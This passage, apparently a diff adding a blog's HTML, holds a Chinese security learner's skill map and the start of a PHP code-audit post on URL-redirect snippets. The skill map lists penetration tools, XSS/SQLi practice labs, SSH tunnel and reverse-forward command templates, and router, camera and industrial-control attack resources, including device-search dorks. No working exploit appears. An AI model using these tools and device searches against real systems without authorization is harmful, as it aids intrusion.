+<li>正则解析（弱）</li>
+<li>JavaScript引擎解析（强）</li>
+</ul>
+</blockquote>
+</li>
+</ul>
+</blockquote>
+</li>
+</ul>
+</blockquote>
+</li>
+<li>[-] office能力<blockquote>
+<ul>
+<li>Word文档编写，看去要专业，尤其对外的</li>
+<li>Excel里面大量的统计、图表功能，需要善于使用</li>
+<li>PPT演讲、培训等必备，如何做好PPT？百度一下…</li>
+<li>[-] 进一步<blockquote>
+<ul>
+<li>yEd</li>
+<li>Visio</li>
+<li>[-] FreeMind<blockquote>
+<ul>
+<li>本技能表就是这个制作</li>
+</ul>
+</blockquote>
+</li>
+</ul>
+</blockquote>
+</li>
+<li>[-] 上手Linux<blockquote>
+<ul>
+<li>《鸟哥的Linux私房菜》</li>
+</ul>
+</blockquote>
+</li>
+<li>[-] 熟练VIM<blockquote>
+<ul>
+<li>实战至少3回合：<a href="http://coolshell.cn/articles/5426.html" target="_blank" rel="external">http://coolshell.cn/articles/5426.html</a></li>
+</ul>
+</blockquote>
+</li>
+<li>[-] 上手Python<blockquote>
+<ul>
+<li><a href="https://www.python.org/dev/peps/pep-0008/" target="_blank" rel="external">https://www.python.org/dev/peps/pep-0008/</a></li>
+<li><a href="http://learnpythonthehardway.org/book/" target="_blank" rel="external">http://learnpythonthehardway.org/book/</a></li>
+<li>[-]《Python核心编程2》<blockquote>
+<ul>
+<li>[-] 第4章 Python对象<blockquote>
+<ul>
+<li>完整熟练</li>
+</ul>
+</blockquote>
+</li>
+<li>[-] 6.8 Unicode<blockquote>
+<ul>
+<li>完整熟练</li>
+</ul>
+</blockquote>
+</li>
+<li>[-] 8.11 迭代器和iter()函数<blockquote>
+<ul>
+<li>完整熟练</li>
+</ul>
+</blockquote>
+</li>
+<li>[-] 第9章 文件的输入和输出</li>
+<li>[-] 完整熟练</li>
+<li>[-] 第10章 错误和异常<blockquote>
+<ul>
+<li>完整熟练</li>
+</ul>
+</blockquote>
+</li>
+<li>[-] 第11章 函数和函数式编程<blockquote>
+<ul>
+<li>完整熟练</li>
+</ul>
+</blockquote>
+</li>
+<li>[-] 第12章 模块<blockquote>
+<ul>
+<li>完整熟练</li>
+</ul>
+</blockquote>
+</li>
+<li>[-] 第14章 执行环境<blockquote>
+<ul>
+<li>完整熟练</li>
+</ul>
+</blockquote>
+</li>
+<li>[-] 第15章 正则表达式<blockquote>
+<ul>
+<li>完整熟练</li>
+</ul>
+</blockquote>
+</li>
+<li>[-] 第18章 多线程编程<blockquote>
+<ul>
+<li>完整熟练</li>
+</ul>
+</blockquote>
+</li>
+<li>[-] 20.2 使用Python进行Web应用：创建一个简单的Web客户端<blockquote>
+<ul>
+<li>完整熟练</li>
+</ul>
+</blockquote>
+</li>
+</ul>
+</blockquote>
+</li>
+</ul>
+</blockquote>
+</li>
+<li>[-] 算法<blockquote>
+<ul>
+<li>快排</li>
+<li>二分</li>
+</ul>
+</blockquote>
+</li>
+<li>[-] 正则表达式<blockquote>
+<ul>
+<li>[-] 调试工具<blockquote>
+<ul>
+<li>Kodos<blockquote>
+<ul>
+<li>[-] RegexBuddy<blockquote>
+<ul>
+<li>支持多种语言</li>
+<li>支持调试优化</li>
+</ul>
+</blockquote>
+</li>
+<li>[-] <a href="http://www.regexper.com/" target="_blank" rel="external">http://www.regexper.com/</a><blockquote>
+<ul>
+<li>正则图解</li>
+</ul>
+</blockquote>
+</li>
+</ul>
+</blockquote>
+</li>
+<li>正则表达式30分钟入门教程：<a href="http://deerchao.net/tutorials/regex/regex.htm" target="_blank" rel="external">http://deerchao.net/tutorials/regex/regex.htm</a></li>
+</ul>
+</blockquote>
+</li>
+<li><a href="http://wiki.ubuntu.org.cn/Python正则表达式操作指南" target="_blank" rel="external">http://wiki.ubuntu.org.cn/Python正则表达式操作指南</a></li>
+<li>《精通正则表达式》</li>
+</ul>
+</blockquote>
+</li>
+<li>[-] 研发能力<blockquote>
+<ul>
+<li>[-] 瀑布模型<blockquote>
+<ul>
+<li>需求-&gt;需求分析-&gt;设计-&gt;开发-&gt;测试-&gt;上线-&gt;运维/运营</li>
+</ul>
+</blockquote>
+</li>
+<li>需求分析能力<blockquote>
+<ul>
+<li>给你一个需求，如何给出一个优美的执行思路——方法论</li>
+<li>这个能力非常非常非常的关键</li>
+</ul>
+</blockquote>
+</li>
+<li>调试能力<blockquote>
+<ul>
+<li>只要定位出，就没有解决不了的Bugs</li>
+<li>[-] 肉眼看到的都是假象<blockquote>
+<ul>
+<li>一定要专业的工具与经验配合</li>
+</ul>
+</blockquote>
+</li>
+<li>Bugs在哪出现，最终就在哪进行真实模拟调试</li>
+<li>[-] 缩小范围<blockquote>
+<ul>
+<li>[-] 构建自己的测试样例<blockquote>
+<ul>
+<li>排除网络复杂未知情况</li>
+</ul>
+</blockquote>
+</li>
+<li>关联模块一个个排除</li>
+<li>[-] Python单步调试<blockquote>
+<ul>
+<li>import pdb;pdb.set_trace()</li>
+<li>在需要单步调试的地方加上面这句，运行程序后中断在此，然后h查看指令进行一步步细细调试</li>
+</ul>
+</blockquote>
+</li>
+<li>粗暴调试：print</li>
+</ul>
+</blockquote>
+</li>
+</ul>
+</blockquote>
+</li>
+<li>[-] 敏捷思想<blockquote>
+<ul>
+<li>快速迭代</li>
+<li>任务拆细</li>
+<li>v1原则：定义好v1的目标，快速完成v1为优先</li>
+<li>习惯Wiki记录，利于沉淀与分享</li>
+</ul>
+</blockquote>
+</li>
+</ul>
+</blockquote>
+</li>
+<li>[-] 翻墙<blockquote>
+<ul>
+<li>[-] 优雅解决方案<blockquote>
+<ul>
+<li>shadowsocks + 一台海外 VPS + Chrome(SwitchyOmega)/Firefox(AutoProxy)</li>
+<li>详情了解：<a href="http://mp.weixin.qq.com/s?__biz=MzA3NTEzMTUwNA==&amp;mid=210457700&amp;idx=1&amp;sn=322d1e4c13d3f33ade848e3889c410bf#rd" target="_blank" rel="external">http://mp.weixin.qq.com/s?__biz=MzA3NTEzMTUwNA==&amp;mid=210457700&amp;idx=1&amp;sn=322d1e4c13d3f33ade848e3889c410bf#rd</a></li>
+</ul>
+</blockquote>
+</li>
+<li>[-] SSH隧道<blockquote>
+<ul>
+<li><a href="http://www.ibm.com/developerworks/cn/linux/l-cn-sshforward/index.html" target="_blank" rel="external">http://www.ibm.com/developerworks/cn/linux/l-cn-sshforward/index.html</a></li>
+<li>[-] 本地转发<blockquote>
+<ul>
+<li>ssh -L <local port="">:<remote host="">:<remote port=""> <ssh hostname=""></ssh></remote></remote></local></li>
+</ul>
+</blockquote>
+</li>
+<li>[-] 远程转发<blockquote>
+<ul>
+<li>反弹</li>
+<li>ssh -R <local port="">:<remote host="">:<remote port=""> <ssh hostname=""></ssh></remote></remote></local></li>
+</ul>
+</blockquote>
+</li>
+<li>[-] 动态转发<blockquote>
+<ul>
+<li>ssh -D <local port=""> <ssh server=""></ssh></local></li>
+</ul>
+</blockquote>
+</li>
+</ul>
+</blockquote>
+</li>
+</ul>
+</blockquote>
+</li>
+</ul>
+</blockquote>
+</li>
+</ul>
+</blockquote>
+</li>
+<li>[-] Web安全<blockquote>
+<ul>
+<li>[-] 零基础如何学习Web安全<blockquote>
+<ul>
+<li>[-] <a href="http://www.zhihu.com/question/21606800/answer/22268855" target="_blank" rel="external">http://www.zhihu.com/question/21606800/answer/22268855</a></li>
+</ul>
+</blockquote>
+</li>
+<li>[-] Web服务组件<blockquote>
+<ul>
+<li>8+1：一图胜千言哎:) </li>
+<li>[-] 钟馗之眼<blockquote>
+<ul>
+<li>网络空间搜索引擎</li>
+<li><a href="http://zoomeye.org" target="_blank" rel="external">http://zoomeye.org</a> </li>
+<li>大量样例：<a href="http://www.zoomeye.org/search/dork" target="_blank" rel="external">http://www.zoomeye.org/search/dork</a></li>
+</ul>
+</blockquote>
+</li>
+<li>组件具有影响面，越底层的组件影响面可能越大</li>
+</ul>
+</blockquote>
+</li>
+<li>[-] 安全维度<blockquote>
+<ul>
+<li>漏洞</li>
+<li>风险</li>
+<li>事件</li>
+</ul>
+</blockquote>
+</li>
+<li>[-] Web安全标准<blockquote>
+<ul>
+<li>OWASP</li>
+<li>WASC</li>
+</ul>
+</blockquote>
+</li>
+<li>[-] 实战环境<blockquote>
+<ul>
+<li>[-] XSS<blockquote>
+<ul>
+<li>[-] 内部平台：ks-xsslab_open<blockquote>
+<ul>
+<li>[-] 可以上手<blockquote>
+<ul>
+<li>XSS</li>
+<li>CSRF</li>
+<li>ClickJacking</li>
+</ul>
+</blockquote>
+</li>
+</ul>
+</blockquote>
+</li>
+<li>[-] <a href="http://xss-quiz.int21h.jp/" target="_blank" rel="external">http://xss-quiz.int21h.jp/</a><blockquote>
+<ul>
+<li>答案：xss_quiz.txt</li>
+</ul>
+</blockquote>
+</li>
+<li>[-] <a href="http://prompt.ml/0" target="_blank" rel="external">http://prompt.ml/0</a><blockquote>
+<ul>
+<li>答案：<a href="https://github.com/cure53/XSSChallengeWiki/wiki/prompt.ml" target="_blank" rel="external">https://github.com/cure53/XSSChallengeWiki/wiki/prompt.ml</a></li>
+</ul>
+</blockquote>
+</li>
+<li>[-] <a href="http://escape.alf.nu/" target="_blank" rel="external">http://escape.alf.nu/</a><blockquote>
+<ul>
+<li>答案：<a href="http://blog.nsfocus.net/alert1-to-win-write-up/" target="_blank" rel="external">http://blog.nsfocus.net/alert1-to-win-write-up/</a></li>
+</ul>
+</blockquote>
+</li>
+</ul>
+</blockquote>
+</li>
+<li>[-] SQL<blockquote>
+<ul>
+<li>[-] <a href="https://github.com/Audi-1/sqli-labs" target="_blank" rel="external">https://github.com/Audi-1/sqli-labs</a><blockquote>
+<ul>
+<li>SQLI-LABS is a platform to learn SQLI</li>
+</ul>
+</blockquote>
+</li>
+</ul>
+</blockquote>
+</li>
+<li>[-] i春秋<blockquote>
+<ul>
+<li><a href="http://www.ichunqiu.com/" target="_blank" rel="external">http://www.ichunqiu.com/</a></li>
+</ul>
+</blockquote>
+</li>
+<li>[-] Sebug + ZoomEye<blockquote>
+<ul>
+<li><a href="http://sebug.net" target="_blank" rel="external">http://sebug.net</a></li>
+<li><a href="http://zoomeye.org" target="_blank" rel="external">http://zoomeye.org</a></li>
+<li>你懂得…<br>工具<br>我的渗透利器<br>Firefox<br>Firebug<br>调试JavaScript，HTTP请求响应观察，Cookie，DOM树观察等<br>Tamper Data<br>拦截修改<br>Live Http Header<br>重放功能<br>Hackbar<br>编码解码/POST提交<br>Modify Headers<br>修改头部<br>GreaseMonkey<br>Original Cookie Injector for Greasemonkey<br>NoScript<br>进行一些JavaScript的阻断<br>AutoProxy<br>翻墙必备<br>Chrome<br>F12<br>打开开发者工具，功能==Firebug+本地存储观察等<br>SwichySharp<br>翻墙必备<br>CookieHacker<br><a href="http://evilcos.me/?p=366" target="_blank" rel="external">http://evilcos.me/?p=366</a><br>Web2.0 Hacking<br>XSS’OR<br>常用其中加解密与代码生成<br><a href="http://evilcos.me/lab/xssor/" target="_blank" rel="external">http://evilcos.me/lab/xssor/</a><br>源码：<a href="https://github.com/evilcos/xssor" target="_blank" rel="external">https://github.com/evilcos/xssor</a><br>XSSEE 3.0 Beta<br>Monyer开发的，加解密最好用神器<br><a href="http://evilcos.me/lab/xssee/" target="_blank" rel="external">http://evilcos.me/lab/xssee/</a><br>Online JavaScript beautifier<br>JavaScript美化工具，分析JavaScript常用<br><a href="http://jsbeautifier.org/" target="_blank" rel="external">http://jsbeautifier.org/</a><br>BeEF<br>The Browser Exploitation Framework<br><a href="http://beefproject.com/" target="_blank" rel="external">http://beefproject.com/</a><br>HTTP代理<br>Fiddler<br>非常经典好用的Web调试代理工具<br>Burp Suite<br>神器，不仅HTTP代理，还有爬虫、漏洞扫描、渗透、爆破等功能<br>mitmproxy<br>Python写的，基于这个框架写神器实在太方便了<br>漏洞扫描<br>AWVS<br>不仅漏扫方便，自带的一些小工具也好用<br>Nmap<br>绝对不仅仅是端口扫描！几百个脚本<br>Python自写脚本/工具<br>漏洞利用<br>sqlmap<br>SQL注入利用最牛神器，没有之一<br>Metasploit<br>最经典的渗透框架<br>Hydra<br>爆破必备<br>抓包工具<br>Wireshark<br>抓包必备<br>Tcpdump<br>Linux下命令行抓包，结果可以给Wireshark分析<br>Sebug + ZoomEye<br>类似这类平台都是我们需要的<br>Sebug类似的<br><a href="https://www.exploit-db.com/" target="_blank" rel="external">https://www.exploit-db.com/</a><br>ZoomEye类似的<br><a href="https://www.shodan.io/" target="_blank" rel="external">https://www.shodan.io/</a><br>Kali Linux<br>除了上面介绍的一些工具，其他海量各类型黑客工具，自己去摸索<br>书<br>《黑客攻防技术宝典（Web实战篇）》<br>《白帽子讲Web安全》<br>《Web前端黑客技术揭秘》<br>我和xisigr出品<br>《Web之困》<br>《SQL注入攻击与防御》<br>papers<br><a href="http://www.exploit-db.com/papers/" target="_blank" rel="external">http://www.exploit-db.com/papers/</a><br>BlackHat/Defcon/XCon/KCon/国内各安全沙龙等相关Papers需要持续跟进<br>idea 嵌入式安全<br>路由器安全<br>基础<br>嵌入式Linux系统方面知识<br>开发系统互联参考模型-第三层网络层<br>MIPS/ARM汇编知识<br>VxWorks系统方面知识<br>JTAG调试接口规范<br>嵌入式系统交叉环境开发<br>路由器芯片方案提供商<br>博通<br>Atheros<br>TrendChip<br>ACROSPEED<br>IC+<br>瑞昱<br>…<br>站点<br><a href="https://www.openwrt.org/" target="_blank" rel="external">https://www.openwrt.org/</a><br>OpenWrt is described as a Linux distribution for embedded devices<br><a href="http://routerpwn.com" target="_blank" rel="external">http://routerpwn.com</a><br>全球主流路由器相关漏洞大集合<br><a href="http://see.sl088.com/wiki/Uboot_%E7%BC%96%E8%AF%91" target="_blank" rel="external">http://see.sl088.com/wiki/Uboot_%E7%BC%96%E8%AF%91</a><br>Uboot_编译<br><a href="http://www.devttys0.com/" target="_blank" rel="external">http://www.devttys0.com/</a><br>Embedded Device Hacking<br>工具<br>Binwalk<br>IDA Pro<br>gdb/gdbserver<br>qemu-system<br>qemu-user-static<br>Smiasm<br>Metasm<br>JTAG硬件调试器<br>书<br>《揭秘家用路由器0day漏洞挖掘技术》<br>《Hacking the XBOX: An Introduction to Reverse Engineering》<br>《Hacking the Cable Modem: What Cable Companies Don’t Want You to Know》<br>《MIPS体系结构透视 》<br>《计算机组成与设计：硬件、软件接口》<br>摄像头安全<br><a href="http://www.openipcam.com/" target="_blank" rel="external">http://www.openipcam.com/</a><br><a href="https://media.blackhat.com/us-13/US-13-Heffner-Exploiting-Network-Surveillance-Cameras-Like-A-Hollywood-Hacker-Slides.pdf" target="_blank" rel="external">https://media.blackhat.com/us-13/US-13-Heffner-Exploiting-Network-Surveillance-Cameras-Like-A-Hollywood-Hacker-Slides.pdf</a><br>工控安全<br>基础<br>工业生产环境的基本结构，如：SCADA、PCS<br>工业生产环境的信息安全风险点（可参考DHS出版物）<br>Improving Industrial Control Systems Cybersecurity with Defense-In-Depth Strategies<br>工控网络组态、逻辑开发、应用组态的基本技术方法<br>抓包、看RFC分析几个常规工业以太网协议，如：Profinet、Modbus<br>买两款PLC玩玩，会真实感受到工业环境的信息安全问题（一定记得买以太网模块，不贵二手几百块）<br>站点<br>事件跟踪分析<br><a href="http://plcscan.org/blog/" target="_blank" rel="external">http://plcscan.org/blog/</a><br><a href="http://scadastrangelove.blogspot.kr" target="_blank" rel="external">http://scadastrangelove.blogspot.kr</a><br><a href="http://www.phdays.com/" target="_blank" rel="external">http://www.phdays.com/</a><br><a href="http://www.scadasl.org" target="_blank" rel="external">http://www.scadasl.org</a><br><a href="https://scadahacker.com" target="_blank" rel="external">https://scadahacker.com</a><br>Duqu<br><a href="https://scadahacker.com/resources/duqu.html" target="_blank" rel="external">https://scadahacker.com/resources/duqu.html</a><br>Stuxnet<br><a href="https://scadahacker.com/resources/stuxnet.html" target="_blank" rel="external">https://scadahacker.com/resources/stuxnet.html</a><br>Havex<br><a href="https://scadahacker.com/resources/havex.html" target="_blank" rel="external">https://scadahacker.com/resources/havex.html</a><br>标准协会/测试工具<br>DHS CET套件<br><a href="http://ics-cert.us-cert.gov/Assessments" target="_blank" rel="external">http://ics-cert.us-cert.gov/Assessments</a><br>NERC ES-ISAC<br><a href="http://www.esisac.com/SitePages/Home.aspx" target="_blank" rel="external">http://www.esisac.com/SitePages/Home.aspx</a><br>ICS-ISAC<br><a href="http://ics-isac.org" target="_blank" rel="external">http://ics-isac.org</a><br>NTSB美国国家工控测试床<br><a href="http://energy.gov/oe/downloads/common-cyber-security-vulnerabilitiesobserved-control-system-assessments-inl-nstb" target="_blank" rel="external">http://energy.gov/oe/downloads/common-cyber-security-vulnerabilitiesobserved-control-system-assessments-inl-nstb</a><br>NIST SP 800-82<br><a href="http://csrc.nist.gov/publications/nistpubs/800-82/SP800-82-final.pdf" target="_blank" rel="external">http://csrc.nist.gov/publications/nistpubs/800-82/SP800-82-final.pdf</a><br>ISA-99控制系统安全协会<br><a href="http://isa99.isa.org/ISA99%20Wiki/Home.aspx" target="_blank" rel="external">http://isa99.isa.org/ISA99%20Wiki/Home.aspx</a><br>NERC CIP标准<br><a href="http://www.nerc.com/pa/Stand/Pages/ReliabilityStandards.aspx" target="_blank" rel="external">http://www.nerc.com/pa/Stand/Pages/ReliabilityStandards.aspx</a><br>工具<br>仿真类<br>电力仿真软件testhaness<br>Modbus仿真软件ModScan<br>电力104协议仿真软件PMA<br>测试类<br>Wurldtech Achilles<br>Codenomicon Defensics<br>Spirent<br>BPS<br>源代码<br>发现<br><a href="https://code.google.com/p/plcscan/" target="_blank" rel="external">https://code.google.com/p/plcscan/</a><br><a href="https://code.google.com/p/modscan/" target="_blank" rel="external">https://code.google.com/p/modscan/</a><br><a href="https://github.com/arnaudsoullie/scan7" target="_blank" rel="external">https://github.com/arnaudsoullie/scan7</a><br><a href="https://github.com/atimorin" target="_blank" rel="external">https://github.com/atimorin</a><br><a href="https://github.com/digitalbond/Redpoint" target="_blank" rel="external">https://github.com/digitalbond/Redpoint</a><br>操纵<br><a href="https://www.scadaforce.com/modbus" target="_blank" rel="external">https://www.scadaforce.com/modbus</a><br><a href="https://github.com/bashwork/pymodbus" target="_blank" rel="external">https://github.com/bashwork/pymodbus</a><br><a href="https://rubygems.org/gems/modbus-cli" target="_blank" rel="external">https://rubygems.org/gems/modbus-cli</a><br><a href="http://libnodave.sourceforge.net" target="_blank" rel="external">http://libnodave.sourceforge.net</a><br><a href="https://code.google.com/p/dnp3" target="_blank" rel="external">https://code.google.com/p/dnp3</a><br>异常监测<br><a href="http://blog.snort.org/2012/01/snort-292-scada-preprocessors.html" target="_blank" rel="external">http://blog.snort.org/2012/01/snort-292-scada-preprocessors.html</a><br><a href="http://www.digitalbond.com/tools/quickdraw/" target="_blank" rel="external">http://www.digitalbond.com/tools/quickdraw/</a><br>Fuzz<br><a href="https://github.com/jseidl/peach-pit/blob/master/modbus/modbus.xml" target="_blank" rel="external">https://github.com/jseidl/peach-pit/blob/master/modbus/modbus.xml</a><br>其他<br>ZoomEye工控专题： <a href="http://ics.zoomeye.org/" target="_blank" rel="external">http://ics.zoomeye.org/</a><br>Shodan工控专题：<a href="https://www.shodan.io/report/l7VjfVKc" target="_blank" rel="external">https://www.shodan.io/report/l7VjfVKc</a><br><a href="https://github.com/evilcos/papers/blob/master/网络空间工控设备的发现与入侵.ppt" target="_blank" rel="external">https://github.com/evilcos/papers/blob/master/网络空间工控设备的发现与入侵.ppt</a><br>zoomeye.org<br>全球可以找到无数真实路由器/摄像头/工控设备等<br>如：<a href="http://www.zoomeye.org/search?q=app:%22MikroTik%20RouterOS%22&amp;from=dork" target="_blank" rel="external">http://www.zoomeye.org/search?q=app:%22MikroTik%20RouterOS%22&amp;from=dork</a><br>研发清单<br>编码环境<br>pip<br>Vagrant<br>tmux/screen<br>vim<br>Markdown<br>zsh + oh-my-zsh<br>Python2.7<br>Django1.4<br><a href="http://djangobook.py3k.cn/2.0/" target="_blank" rel="external">http://djangobook.py3k.cn/2.0/</a><br>Django Debug Toolbar<br>其他框架<br>web.py<br>Flask<br>Tornado<br>node.js<br>Ubuntu/Gentoo/Centos<br>ipython<br>版本控制<br>废弃SVN，全面拥抱Git<br>GitLab<br>Nginx+uWSGI<br>Python<br>官方手册<br>至少过一遍，这都没过一遍，视野会局限<br>行之说：「我没看过Python的书，却熟读官方手册…」<br>Linux/UNIX<br>书<br>《鸟哥的Linux私房菜》<br>《Linux Shell脚本攻略》<br>《UNIX编程艺术》<br>《Software Design 中文版 01》《Software Design 中文版 02》《Software Design 中文版 03》<br>让你的电脑默认操作系统就是Linux…<br>前端<br>书<br>《JavaScript DOM编程艺术》<br>了解DOM<br>这同样是搞好前端安全的必要基础<br>库<br>jQuery<br>优秀的插件应该体验一遍，并做些尝试<br>官方文档得过一遍<br>D3.js<br>ECharts<br>来自百度<br>Google API<br>ZoomEye Map组件<br>ZoomEye团队自己基于开源的打造<br>AngularJS<br>Google出品的颠覆性前端框架<br>Bootstrap<br>应该使用一遍<br>爬虫进阶<br>代理池<br>爬虫「稳定」需要<br>网络请求<br>wget/curl<br>urllib2/httplib2/requests<br>idea scrapy<br>验证码破解<br>pytesser<br>调度<br>crontab是最原生的定时调度<br>基于redis实现的分布式调度<br>基于rpyc实现的分布式调度<br>celery/gearman等调度框架<br>并发<br>线程池<br>进程内优美的并发方案<br>协程<br>进程内另一种优美的并发方案<br>gevent<br>多进程<br>os.fork<br>idea multiprocessing<br>数据结构<br>JSON<br>cPickle<br>protobuf<br>数据存储及处理<br>数据库<br>MySQL<br>MongoDB<br>Cassandra<br>Hadoop体系<br>Redis<br>Sqlite<br>bsddb<br>ElasticSearch<br>大数据处理<br>Hive<br>Spark<br>ELK<br>ElasticSearch<br>Logstash<br>Kibana<br>DevOps<br>SSH证书<br>Fabric<br>SaltStack<br>puppet<br>pssh/dsh<br>运维进阶<br>运维工程师必须掌握的基础技能有哪些？<br><a href="http://www.zhihu.com/question/23665108/answer/25299881" target="_blank" rel="external">http://www.zhihu.com/question/23665108/answer/25299881</a><br>调试<br>pdb<br>logging<br>Sentry<br>strace/ltrace<br>lsof<br>性能<br>Python内<br>timeit<br>cProfile<br>Python性能分析指南：<a href="http://www.oschina.net/translate/python-performance-analysis" target="_blank" rel="external">http://www.oschina.net/translate/python-performance-analysis</a><br>Python外<br>top/htop/free/iostat/vmstat/ifconfig/iftop…<br>算法<br>分词<br>贝叶斯<br>神经元<br>遗传算法<br>聚类/分类<br>…<br>持续集成<br>自测试<br>nose<br>Jenkins<br>idea 安全<br>我的分享<br>程序员与黑客：<a href="http://www.infoq.com/cn/presentations/programmers-and-hackers" target="_blank" rel="external">http://www.infoq.com/cn/presentations/programmers-and-hackers</a><br>协作<br>类似Trello的在线协同平台<br>Slack<br>微信<br>立会<br>设计思想<br>人人都是架构师：具备架构思想是一件多酷的事<br>实战出真知<br>如何设计<br>attach 任务架构设计变迁.pdf<br>松耦合、紧内聚<br>单元与单元属性<br>生产者与消费者<br>结构<br>队列<br>LRU<br>分布式<br>存储<br>计算<br>资源考虑<br>CPU<br>内存<br>带宽<br>粗暴美学/暴力美学<br>大数据，先考虑run it，然后才能知道规律在哪<br>「run it优先」能快速打通整体，洞察问题<br>「run it优先」能摆脱细节（繁枝末节）的束缚<br>「run it优先」能快速迭代出伟大的v1<br>一个字总结<br>美<br>牛人1,2,3<br>1研究：研究东西，有足够洞察力，研究水准不错<br>2研发：Hack Idea自己有魄力实现，不懂研发的黑客如同不会游泳的海盗<br>3工程：研发出来的需要实战、需要工程化，否则只是玩具，而不能成为真的武器<br>优质资源<br>书<br>多关注电子工业/图灵/机械工业/人民邮电等出版社，他们有专业团队来保障每年输出优质书籍<br>自己需要掌握鉴别好书的能力<br>站点<br>知乎周刊：<a href="http://zhuanlan.zhihu.com/Weekly" target="_blank" rel="external">http://zhuanlan.zhihu.com/Weekly</a><br>码农周刊：<a href="http://weekly.manong.io/" target="_blank" rel="external">http://weekly.manong.io/</a><br>Pycoder’s Weekly：<a href="http://pycoders.com/archive/" target="_blank" rel="external">http://pycoders.com/archive/</a><br>Hacker News：<a href="https://news.ycombinator.com/" target="_blank" rel="external">https://news.ycombinator.com/</a><br>Startup News：<a href="http://news.dbanotes.net/" target="_blank" rel="external">http://news.dbanotes.net/</a><br>开发者头条：<a href="http://toutiao.io/" target="_blank" rel="external">http://toutiao.io/</a><br>极客头条：<a href="http://geek.csdn.net/" target="_blank" rel="external">http://geek.csdn.net/</a><br>InfoQ：<a href="http://www.infoq.com/cn" target="_blank" rel="external">http://www.infoq.com/cn</a><br>Stack Overflow：<a href="http://stackoverflow.com/" target="_blank" rel="external">http://stackoverflow.com/</a><br>GitHub：<a href="https://github.com/" target="_blank" rel="external">https://github.com/</a><br>FreeBuf：<a href="http://www.freebuf.com/" target="_blank" rel="external">http://www.freebuf.com/</a><br>WooYun：<a href="http://drops.wooyun.org/" target="_blank" rel="external">http://drops.wooyun.org/</a><br>深蓝阅读：<a href="http://bluereader.org/" target="_blank" rel="external">http://bluereader.org/</a><br>RSS订阅<br>漏洞相关<br><a href="http://sebug.net/rss.xml" target="_blank" rel="external">http://sebug.net/rss.xml</a><br><a href="https://www.exploit-db.com/rss.xml" target="_blank" rel="external">https://www.exploit-db.com/rss.xml</a><br><a href="https://rss.packetstormsecurity.com" target="_blank" rel="external">https://rss.packetstormsecurity.com</a><br><a href="http://www.wooyun.org/feeds/public" target="_blank" rel="external">http://www.wooyun.org/feeds/public</a><br>强烈推荐圈内人打造的深蓝阅读<br><a href="http://bluereader.org/" target="_blank" rel="external">http://bluereader.org/</a><br>这上面已经很多黑客/技术类似的RSS资源了<br>威胁情报<br>本来不想提任何这方面的，想想还是抖个资源，如下<br><a href="https://github.com/kbandla/APTnotes" target="_blank" rel="external">https://github.com/kbandla/APTnotes</a><br>安全平台<br>在线学习平台<br>i春秋：<a href="http://www.ichunqiu.com" target="_blank" rel="external">http://www.ichunqiu.com</a><br><a href="https://pentesterlab.com" target="_blank" rel="external">https://pentesterlab.com</a><br>PoC提交与学习<br>Sebug: <a href="http://sebug.net" target="_blank" rel="external">http://sebug.net</a><br>Beebeeto: <a href="http://www.beebeeto.com" target="_blank" rel="external">http://www.beebeeto.com</a><br>Bugscan: <a href="http://www.bugscan.net" target="_blank" rel="external">http://www.bugscan.net</a><br>Tangscan: <a href="http://www.tangscan.com" target="_blank" rel="external">http://www.tangscan.com</a><br>结尾<br>本技能表会持续不断更新<br>如果有相关好资源/建议可以联系我：evilcos@gmail.com<br>如果本技能表引起你的强烈共鸣，想加入我们，可以联系我：evilcos@gmail.com，我会结合你的情况<br>给你仅仅一道有趣的笔试题<br>或者和你线下约聊<br>messagebox_warning 邮件联系我，邮件标题务必包含「技能表」三个字，感谢<br>TO BE A HACKER:)</li>
+</ul>
+</blockquote>
+</li>
+</ul>
+</blockquote>
+</li>
+</ul>
+</blockquote>
+</li>
+</ul>
+
+          
+        
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+
+
+    
+      
+
+  
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+            
+            
+              
+                
+                <a class="post-title-link" href="/2016/06/23/PHP-Code-Review/" itemprop="url">
+                  Unbenannt
+                </a>
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            <span class="post-meta-item-icon">
+              <i class="fa fa-calendar-o"></i>
+            </span>
+            <span class="post-meta-item-text">Veröffentlicht am</span>
+            <time itemprop="dateCreated" datetime="2016-06-23T01:59:30+08:00" content="2016-06-23">
+              2016-06-23
+            </time>
+          </span>
+
+          
+
+          
+            
+          
+
+          
+
+          
+          
+
+          
+        </div>
+      </header>
+    
+
+
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h2 id="代码审计"><a href="#代码审计" class="headerlink" title="代码审计"></a>代码审计</h2><h3 id="redirection-URL重定向"><a href="#redirection-URL重定向" class="headerlink" title="redirection/URL重定向"></a>redirection/URL重定向</h3><h4 id="1-META标签内跳转"><a href="#1-META标签内跳转" class="headerlink" title="1) META标签内跳转"></a>1) META标签内跳转</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;meta http-equiv=&quot;refresh&quot; content=&quot;0.1; url=http://blog.safebuff.com/&quot;&gt;</span><br></pre></td></tr></table></figure>
+<h4 id="2-Javascript跳转"><a href="#2-Javascript跳转" class="headerlink" title="2) Javascript跳转"></a>2) Javascript跳转</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;window.location.href = &quot;http://baidu.cn/&quot;;&lt;/script&gt;</span><br><span class="line">&lt;script&gt;self.location = &quot;http://baidu.cn/&quot;;&lt;/script&gt;</span><br><span class="line">&lt;script&gt;top.location = &quot;http://baidu.cn/&quot;;&lt;/script&gt;</span><br><span class="line">&lt;script&gt;window.navigate(&quot;http://baidu.cn/&quot;);&lt;/script&gt;   #只对IE系列浏览器有效</span><br></pre></td></tr></table></figure>
